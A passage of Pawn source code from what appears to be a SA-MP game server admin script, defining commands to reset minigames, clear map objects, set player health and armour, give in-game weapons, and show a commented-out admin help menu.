			SetPlayerVirtualWorld(a, WORLDID_DEFAULT);
			SpawnPlayer(a);
		}
	}
	StopRR();
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Russian Roulette reset");
	SendCommandMessageToAdmins(playerid, "resetrr");
	return 1;
}

dcmd_resetderby(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a) && player[a][playingderby] == 1)
	   	{
			new vDID = GetPlayerVehicleID(a);
			if (vDID) DestroyVehicle(vDID);

			player[a][playingderby] = 0;
 			SetPlayerVirtualWorld(a, WORLDID_DEFAULT);
			TogglePlayerControllable(a, 1);
			SetPlayerColor(a, PlayerColors[random(sizeof(PlayerColors))]);
			SpawnPlayer(a);
		}
	}
	StopDerby();
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Derby reset");
	SendCommandMessageToAdmins(playerid, "resetderby");
	return 1;
}

dcmd_resetgroup(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a))
	   	{
			player[a][moviecrew] = -1;
			player[a][chat] = 0;
			player[a][crewinvite] = -1;
		}
	}

	for (new c = 0; c < MAX_GROUPS; c++)
	{
		crewowner[c] = -1;
		crews[c] = 0;
		crewscene[c] = 0;
		crewshot[c] = 0;
	}

	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Groups reset");
	SendCommandMessageToAdmins(playerid, "resetgroup");
	return 1;
}

dcmd_resetcc(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a) && player[a][playingcc] == 1)
	   	{
			TogglePlayerControllable(a, 1);
			TextDrawHideForPlayer(a, ccstatus[a]);
			TextDrawHideForPlayer(a, ccstatus2);
			TextDrawHideForPlayer(a, ccstatus3);
			TextDrawHideForPlayer(a, ccstatus4);
			TextDrawHideForPlayer(a, ccstatus5);
			if (servergodmode) player[a][godmode] = 1;
			SetPlayerColor(a, PlayerColors[random(sizeof(PlayerColors))]);
			player[a][playingcc] = 0;
			player[a][playerccmode] = 0;
			SetPlayerVirtualWorld(a, WORLDID_DEFAULT);
			SpawnPlayer(a);
			SetPlayerTeam(a, a);
		   	ResetBounds(a);
		}
	}
	StopCC();
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Cop Chase reset");
	SendCommandMessageToAdmins(playerid, "resetcc");
	return 1;
}

dcmd_resetnb(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a) && player[a][playingnb] == 1)
	   	{
			TogglePlayerControllable(a, 1);
			TextDrawHideForPlayer(playerid, nbhelptd1);
			TextDrawHideForPlayer(playerid, nbhelptd2);
			if (servergodmode) player[a][godmode] = 1;
			SetPlayerColor(a, PlayerColors[random(sizeof(PlayerColors))]);
			player[a][playingnb] = 0;
			player[a][playernbteam] = 0;
			player[a][playernbmode] = 0;
			SetPlayerVirtualWorld(a, WORLDID_DEFAULT);
			SpawnPlayer(a);
			SetPlayerTeam(a, a);
		}
	}
	StopNB();
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Nadeball reset");
	SendCommandMessageToAdmins(playerid, "resetnb");
	return 1;
}

dcmd_resetwz(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a) && player[a][playingwarzone] == 1)
	   	{
			TogglePlayerControllable(a, 1);
			if (servergodmode) player[a][godmode] = 1;
			SetPlayerColor(a, PlayerColors[random(sizeof(PlayerColors))]);
			player[a][playingwarzone] = 0;
			player[a][playerwarzoneteam] = 0;
			if (player[a][playerwarzonemode] == 1)
			{
				SpawnPlayer(a);
				player[a][playerwarzonemode] = 0;
			} else {
				player[a][Spectating] = 0;
				player[a][SpectatingOn] = -1;
			    TogglePlayerSpectating(a, false);
			}
			player[a][playerwarzoneset] = 0;
			player[a][moviecrew] = -1;
			SetPlayerVirtualWorld(a, WORLDID_DEFAULT);
			SetPlayerTeam(a, a);
			SetPlayerArmour(a, 0.00);
			TextDrawHideForPlayer(a, wzhelptd1);
			TextDrawHideForPlayer(a, wzhelptd2);
			TextDrawHideForPlayer(a, wzteamtd1);
			TextDrawHideForPlayer(a, wzteamtd2);
			TextDrawHideForPlayer(a, wzteamtd3);
			TextDrawHideForPlayer(a, wzweaponsettd1);
			TextDrawHideForPlayer(a, wzweaponsettd2);
			TextDrawHideForPlayer(a, wzweaponsettd3);
			TextDrawHideForPlayer(a, wzweaponsettd4);
			TextDrawHideForPlayer(a, wzweaponsettd5);
			TextDrawHideForPlayer(a, wzstatustd1);
			TextDrawHideForPlayer(a, wzstatustd2);
		}
	}
	StopWarzone();
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Warzone reset");
	SendCommandMessageToAdmins(playerid, "resetwz");
	return 1;
}

dcmd_aclear(playerid, params[])
{
 	#pragma unused params

	new vehicles2 = CallRemoteFunction("CallVCLEAR", "");
	new jetpacks = CallRemoteFunction("CallJCLEAR", "");
	CallRemoteFunction("AllClearObjects2", "");
	
	// put back the needed objects
	CreateDynamicObject(14548, 1000, 1000, 1000, 5.0, 0.0, 0.0); // andromada interior
	andromadadoor = CreateDynamicObject(987, 1002.97, 1023.84, 994.41, 270.00, 0.00, 90.00); // andromada door

	CreateDynamicObject(2188, 1993.775634, 1017.794677, 994.870849, 0.000000, 0.000000, 0.000000); // russian roulette table
	CreateDynamicObject(2188, 1993.821411, 1017.807250, 994.870666, 0.000000, 0.000000, 180.000000); // russian roulette table

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[INFO] %d Vehicles, %d Jetpacks and Maps cleared by %s", vehicles2, jetpacks, playername);
	SendClientMessageToAll(COLOR_ORANGE, strings);
	format(strings, sizeof(strings), "0,1>> [INFO] %d Vehicles, %d Jetpacks and Maps cleared by %s", vehicles2, jetpacks, playername);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	return true;
}

dcmd_skipaclear(playerid,params[])
return dcmd_saclear(playerid,params);

dcmd_saclear(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (skipaclear == false)
	{
	    skipaclear = true;
    	format(strings, sizeof(strings), "Next automatic AllClear system will be skipped (%s)", playername);
	} else {
	    skipaclear = false;
    	format(strings, sizeof(strings), "Next automatic AllClear system will NOT be skipped (%s)", playername);
	}
	SendServerMessageToAll(EMBED_ORANGE, strings);
	SendCommandMessageToAdmins(playerid, "s(kip)aclear");
	return 1;
}

dcmd_papc(playerid,params[])
{
	#pragma unused params

	if (player[playerid][apc] == 1) player[playerid][apc] = 0;
 	else player[playerid][apc] = 1;
	return 1;
}

dcmd_pacc(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (player[playerid][acc] == 1) player[playerid][acc] = 0;
 	else player[playerid][acc] = 1;
	return 1;
}

dcmd_asay(playerid, params[])
{
	/*if (!strlen(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /asay (<colour>) <message>");
		SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
	 	return 1;
	}

	new idx,
		color[50],
		realcolor;

	color = strtok(params, idx);
	if (!strcmp(color, "grey",true))   { realcolor = 0xAFAFAFAA; goto coloured; }
	if (!strcmp(color, "green",true))  { realcolor = COLOR_GREEN; goto coloured; }
	if (!strcmp(color, "red",true))    { realcolor = 0xFF0000AA; goto coloured; }
	if (!strcmp(color, "yellow",true)) { realcolor = 0xFFFF00AA; goto coloured; }
	if (!strcmp(color, "white",true))  { realcolor = 0xFFFFFFAA; goto coloured; }
	if (!strcmp(color, "blue",true))   { realcolor = 0x0000BBAA; goto coloured; }
	if (!strcmp(color, "lblue",true))  { realcolor = 0x00FFFFAA; goto coloured; }
	if (!strcmp(color, "orange",true)) { realcolor = 0xFF9900AA; goto coloured; }
	if (!strcmp(color, "black",true))  { realcolor = 0x000000AA; goto coloured; }
	if (!strcmp(color, "pink",true))   { realcolor = COLOR_PINK; goto coloured; }
	if (!strcmp(color, "lime",true))   { realcolor = COLOR_LIME; goto coloured; }
	if (!strcmp(color, "gold",true))   { realcolor = COLOR_GOLD; goto coloured; }
	if (!strcmp(color, "brown",true))  { realcolor = COLOR_BROWN; goto coloured; }
	if (!strcmp(color, "random",true)) { realcolor = PlayerColors[random(sizeof(PlayerColors))]; goto coloured; }

	if (strlen(params))
	{
		SendClientMessageToAll(COLOR_NAVYBLUE, params);
		SendCommandMessageToAdmins(playerid, "asay");
		format(strings, sizeof(strings), "6(ASAY) %s", params);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		return 1;
	}

	coloured:

	if (!strlen(params[strlen(color)+1]))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /asay <colour> <message>");
		SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
	 	return 1;
	}

	SendClientMessageToAll(realcolor, params[strlen(color)+1]);
	SendCommandMessageToAdmins(playerid, "asay");
	format(strings, sizeof(strings), "6(ASAY-%s) %s", color, params[strlen(color)+1]);
	IRC_GroupSay(1, IRC_CHANNEL, strings);*/

	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /asay <message> [Colour tags allowed, for example -RED]");

	SendClientMessageToAll(PlayerColors[random(sizeof(PlayerColors))], ColouredText(params));
	SendCommandMessageToAdmins(playerid, "asay");
	format(strings, sizeof(strings), "6(ASAY) %s", params);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	return 1;
}

dcmd_sethealth(playerid,params[])
{
	new idx,
		phealth;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /sethealth <name|id> <0-10000>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 10000)
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /sethealth <name|id> <0-10000>");
	phealth = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "Player is not connected!");

	if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
	return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	player[giveplayerid][godmode] = 0;
	SetPlayerHealth(giveplayerid, phealth);
	SendCommandMessageToAdmins(playerid, "sethealth");
	return 1;
}

dcmd_setarmour(playerid,params[])
{
	dcmd_setarmor(playerid,params);
	return 1;
}

dcmd_setarmor(playerid,params[])
{
	new idx,
		aarmor;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /setarmour <name|id> <0-10000>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 10000)
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /setarmour <name|id> <0-10000>");
	aarmor = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "Player is not connected!");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	SetPlayerArmour(giveplayerid, aarmor);
	SendCommandMessageToAdmins(playerid, "setarmour");
	return 1;
}

dcmd_carhealth(playerid,params[])
{
	new idx,
		chealth;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /carhealth <name|id> <0-10000>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 10000)
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /carhealth <name|id> <0-10000>");
	chealth = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "Player is not connected!");

	if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
	return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	player[giveplayerid][vgodmode] = 0;
	SetVehicleHealth(GetPlayerVehicleID(giveplayerid), chealth);
	SendCommandMessageToAdmins(playerid, "carhealth");
	return 1;
}

dcmd_giveweapon(playerid,params[])
{
	new idx,
	 	weapon = -1,
 		ammo,
 		bool:all = false;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /giveweapon <name|id/all> <weapon> <ammo>");

	if (!strcmp(tmps2, "all", true))
	{
		all = true;
		goto next;
  	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	next:
	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /giveweapon <name|id/all> <weapon> <ammo>");

	if (!IsNumeric(tmps2))
	{
	    for (new i = 0; i < sizeof(aWeaponNames); i++)
	    {
		    if (i == 19 || i == 20 || i == 21 || i == 52)
			continue;
			
			if (strfind(aWeaponNames[i], tmps2, true) != -1)
			{
				weapon = i;
				break;
			}
		}
	} else weapon = strval(tmps2);

	if (weapon == -1 || weapon < 0 || weapon > 47)
	return SendErrorMessage(playerid, EMBED_WHITE, "You must enter a valid weapon");

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /giveweapon <name|id/all> <weapon> <ammo>");
	ammo = strval(tmps2);

	if (all == true)
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && IsPlayerSpawned(i))
		    {
		        if (!IsPlayerInDMSPJA(i))
		       	GivePlayerWeapon(i, weapon, ammo);
		    }
		}
		SendCommandMessageToAdmins(playerid, "giveweapon");
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		GivePlayerWeapon(giveplayerid, weapon, ammo);
		SendCommandMessageToAdmins(playerid, "giveweapon");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_ahelp(playerid,params[])
{
	#pragma unused params
	return SendErrorMessage(playerid, EMBED_WHITE, "This command was removed. Please type /help to see all the commands.");
	/*new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ahelp <1-5>");

	switch(strval(strings)) {
 	case 1: {
			switch(player[playerid][ADMIN])
			{
				case 1:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P1:L1 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /slap | /hide - Hide/shows admin status");
					SendClientMessage(playerid, COLOR_ORANGE, "| /giveweapon <n|id/all> <weapon> <ammo> - Give weapon & ammo");
					SendClientMessage(playerid, COLOR_ORANGE, "| /say|(c/p)announce (player) <text> - Talk/announce as admin");
					SendClientMessage(playerid, COLOR_ORANGE, "| /warn <n|id> <reason> - On 2nd warning = kick");
					SendClientMessage(playerid, COLOR_ORANGE, "| /gotoseat <n|id/out> <seatID> - Goto in player's car");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 2:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P1:L2 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /slap | /hide - Hide/shows admin status");
					SendClientMessage(playerid, COLOR_ORANGE, "| /giveweapon <n|id/all> <weapon> <ammo> - Give weapon & ammo");
					SendClientMessage(playerid, COLOR_ORANGE, "| /say|(c/p)announce (player) <text> - Talk/announce as admin");
					SendClientMessage(playerid, COLOR_ORANGE, "| /warn <n|id> <reason> - On 2nd warning = kick");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /gotoseat <n|id> <seatID> - Goto player car USE WITH CARE");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)jail <n|id> - (Un)Jail a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcespawn/class - Force player to (re)spawn or class");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 3:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P1:L3 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /asay /slap | /hide - Hide/shows admin status");
					SendClientMessage(playerid, COLOR_ORANGE, "| /set(car)health <n|id> <0-100(0)> - Set Player|Car health");
					SendClientMessage(playerid, COLOR_ORANGE, "| /giveweapon <n|id/all> <weapon> <ammo> - Give weapon & ammo");
					SendClientMessage(playerid, COLOR_ORANGE, "| /say|(c/p)announce (player) <text> - Talk/announce as admin");
					SendClientMessage(playerid, COLOR_ORANGE, "| /warn <n|id> <reason> - On 2nd warning = kick");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /gotoseat <n|id> <seatID> - Goto player car USE WITH CARE");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)jail <n|id> - Jail a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P1:L4 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /asay | /slap | /hide - Hide/shows admin status");
					SendClientMessage(playerid, COLOR_ORANGE, "| /set(car)health <n|id> <0-100(0)> - Set Player|Car health");
					SendClientMessage(playerid, COLOR_ORANGE, "| /giveweapon <n|id/all> <weapon> <ammo> - Give weapon & ammo");
					SendClientMessage(playerid, COLOR_ORANGE, "| /say|(c/p)announce (player) <text> - Talk/announce as admin");
					SendClientMessage(playerid, COLOR_ORANGE, "| /warn <n|id> <reason> - On 2nd warning = kick");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /gotoseat <n|id> <seatID> - Goto player car USE WITH CARE");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)jail <n|id> - Jail a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 5,6:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P1:L5 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /asay /slap | /hide - Hide/shows admin status");
					SendClientMessage(playerid, COLOR_ORANGE, "| /set(car)health <n|id> <0-100(0)> - Set Player|Car health");
					SendClientMessage(playerid, COLOR_ORANGE, "| /giveweapon <n|id/all> <weapon> <ammo> - Give weapon & ammo");
					SendClientMessage(playerid, COLOR_ORANGE, "| /say|(c/p)announce (player) <text> - Talk/announce as admin");
					SendClientMessage(playerid, COLOR_ORANGE, "| /warn <n|id> <reason> - On 2nd warning = kick");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /gotoseat <n|id> <seatID> - Goto player car USE WITH CARE");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)jail <n|id> - Jail a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
			}
			return 1;
	        }
    case 2: {
			switch(player[playerid][ADMIN])
			{
				case 1:
				{
					SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 1.");
				}
				case 2:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P2:L2 Admin Commands:___________________");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)mute <n|id/chat> - (Un)Mute a player/chat");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)freeze <n|id> <reason> - (Un)freeze a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /disarm <n|id/all> - Remove a player's weapons");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setinterior/world <n|id> <inter/worldid> - Set interior/world");
					SendClientMessage(playerid, COLOR_ORANGE, "| /knife <n|id> - Knife a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /kick <n|id> <reason> - Kick a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 3:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P2:L3 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgod - Turn on|off godmode for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcespawn/class - Force player to (re)spawn or class");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)mute <n|id/chat> - (Un)Mute a player/chat");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)freeze <n|id> <reason> - (Un)freeze a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /disarm <n|id/all> - Remove a player's weapons");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setinterior/world <n|id> <inter/worldid> - Set interior/world");
					SendClientMessage(playerid, COLOR_ORANGE, "| /knife <n|id> - Knife a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /kick <n|id> <reason> - Kick a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P2:L4 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setg(ravity) - Set server gravity");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcespawn/class - Force player to (re)spawn or class");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)mute <n|id/chat> - (Un)Mute a player/chat");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)freeze <n|id> <reason> - (Un)freeze a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /disarm <n|id/all> - Remove a player's weapons");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setinterior/world <n|id> <inter/worldid> - Set interior/world");
					SendClientMessage(playerid, COLOR_ORANGE, "| /knife <n|id> - Knife a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /kick <n|id> <reason> - Kick a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 5,6:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P2:L5 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setg(ravity) - Set server gravity");
					SendClientMessage(playerid, COLOR_ORANGE, "| /forcespawn/class - Force player to (re)spawn or class");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)mute <n|id/chat> - (Un)Mute a player/chat");
					SendClientMessage(playerid, COLOR_ORANGE, "| /(un)freeze <n|id> <reason> - (Un)freeze a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /disarm <n|id/all> - Remove a player's weapons");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setinterior/world <n|id> <inter/worldid> - Set interior/world");
					SendClientMessage(playerid, COLOR_ORANGE, "| /knife <n|id> - Knife a player");
					SendClientMessage(playerid, COLOR_ORANGE, "| /kick <n|id> <reason> - Kick a player");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
			}
			return 1;
	        }
    case 3: {
			switch(player[playerid][ADMIN])
			{
				case 1:
				{
		        	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 1.");
				}
				case 2:
				{
		        	SendClientMessage(playerid, COLOR_RED, "No more further commands for admin level 2.");
				}
				case 3:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P3:L3 Admin Commands:____________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /akill|explode|bigbang(2) <n|id> - *");
					SendClientMessage(playerid, COLOR_ORANGE, "| /settags - Turn on|off nametags for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgoto - Turn on |off /goto cmd for everybody");
                    SendClientMessage(playerid, COLOR_ORANGE, "| /setchat - Coloured chat");
                    SendClientMessage(playerid, COLOR_ORANGE, "| /join|leavecrew (<ID>) - Join crew without invite");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /aeject <n|id> - Eject player from vehicle");
					SendClientMessage(playerid, COLOR_ORANGE, "| /strike <n|id> - Explode player trough lightning");
					SendClientMessage(playerid, COLOR_ORANGE, "| /cw(clearwarnings) <n|id> - Reset player warnings");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P3:L4 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgod - Turn on|off godmode for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /settags - Turn on|off nametags for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgoto - Turn on |off /goto cmd for everybody");
     				SendClientMessage(playerid, COLOR_ORANGE, "| /setchat - Coloured chat");
         			SendClientMessage(playerid, COLOR_ORANGE, "| /join|leavecrew (<ID>) - Join crew without invite");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /aeject <n|id> - Eject player from vehicle");
					SendClientMessage(playerid, COLOR_ORANGE, "| /strike <n|id> - Explode player trough lightning");
					SendClientMessage(playerid, COLOR_ORANGE, "| /cw(clearwarnings) <n|id> - Reset player warnings");
					SendClientMessage(playerid, COLOR_ORANGE, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
				}
				case 5,6:
				{
					SendClientMessage(playerid, COLOR_ORANGE, "___________________ P3:L5 Admin Commands:___________________");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgod - Turn on|off godmode for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /settags - Turn on|off nametags for everybody");
					SendClientMessage(playerid, COLOR_ORANGE, "| /setgoto - Turn on |off /goto cmd for everybody");
     				SendClientMessage(playerid, COLOR_ORANGE, "| /setchat - Coloured chat");
     				SendClientMessage(playerid, COLOR_ORANGE, "| /join|leavecrew (<ID>) - Join crew without invite");
   					SendClientMessage(playerid, COLOR_ORANGE, "| /aeject <n|id> - Eject player from vehicle");
					SendClientMessage(playerid, COLOR_ORANGE, "| /strike <n|id> - Explode player trough lightning");
					SendClientMessage(playerid, COLOR_ORANGE, "| /cw(clearwarnings) <n|id> - Reset player warnings");
